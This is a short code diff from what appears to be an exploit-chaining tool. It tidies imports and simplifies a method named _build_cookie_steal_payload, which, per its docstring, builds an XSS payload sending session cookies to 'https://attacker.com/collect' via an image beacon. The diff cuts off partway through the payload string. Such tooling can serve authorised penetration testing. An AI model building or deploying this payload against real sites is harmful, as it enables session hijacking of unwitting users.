@@ -32,7 +32,7 @@ from abc import ABC, abstractmethod
 from collections import defaultdict, deque
 from dataclasses import dataclass, field
 from pathlib import Path
-from typing import Any, Callable, Dict, Generator, List, Optional, Set, Tuple
+from typing import Any, Callable, Dict, Generator, List, Optional, Set
 
 _logger = logging.getLogger(__name__)
 
@@ -2335,9 +2335,7 @@ class ChainExploitRunner:
     @staticmethod
     def _build_cookie_steal_payload(target_url: str) -> str:
         """Build an XSS payload that exfiltrates session cookies."""
-        from urllib.parse import urlparse
-        origin = urlparse(target_url)
-        collector = f"https://attacker.com/collect"
+        collector = "https://attacker.com/collect"
         return (
             f'<script>'
             f'var i=new Image();'
